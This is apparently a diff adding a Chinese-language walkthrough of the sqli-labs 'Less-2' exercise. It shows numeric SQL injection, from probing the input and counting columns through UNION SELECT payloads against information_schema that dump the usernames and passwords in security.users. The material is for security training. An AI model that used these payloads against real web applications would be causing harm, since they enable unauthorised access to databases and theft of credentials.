@@ -106,4 +106,51 @@ select 1,group_concat(username),group_concat(password) from security.users --+
 > 6. 获得列名
 > 7. 获取数据
 
+---
+
+## sqli-less2
+
+![](./images/sqli2_1.png)
+![](./images/sqli2_2.png)
+![](./images/sqli2_3.png)
+输入?id=1 and 1=1 有回显，?id=1 and 1=2无回显，判断出是数字型注入
+
+![](./images/sqli2_4.png)
+输入 order by 3+ 发现有回显，输入 order by 4+ 发现无回显，判断出有3个字段
+
+![](./images/sqli2_5.png)
+发现可以使用union联合注入，输入如下语句
+```
+?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata LIMIT 0, 1 --+
+```
+![](./images/sqli2_6.png)
+得到所有数据库的名称：information_schema,challenges,mysql,performance_schema,security,sys
+
+```
+union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ LIMIT 0,1
+```
+![](./images/sqli2_7.png)
+得到security数据库中的所有表：emails,referers,uagents,users
+
+```sql
+SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = 'security' and table_name = 'users' --+ LIMIT 0,1
+```
+![](./images/sqli2_8.png)
+得到security.users表中的所有列名：id,username,password
+
+```sql
+SELECT * FROM users WHERE id='-1'union select 1,group_concat(username),group_concat(password) from security.users --+
+```
+![](./images/sqli2_9.png)
+得到users表中password的所有数据
+
+### 总结（与less2方式相同）
+> 1. 判断注入点
+> 2. 判断注入类型
+> 3. 判断闭合方式
+> 4. 判断字段数
+> 5. 获得数据库名称
+> 6. 获得列名
+> 7. 获取数据
+
 
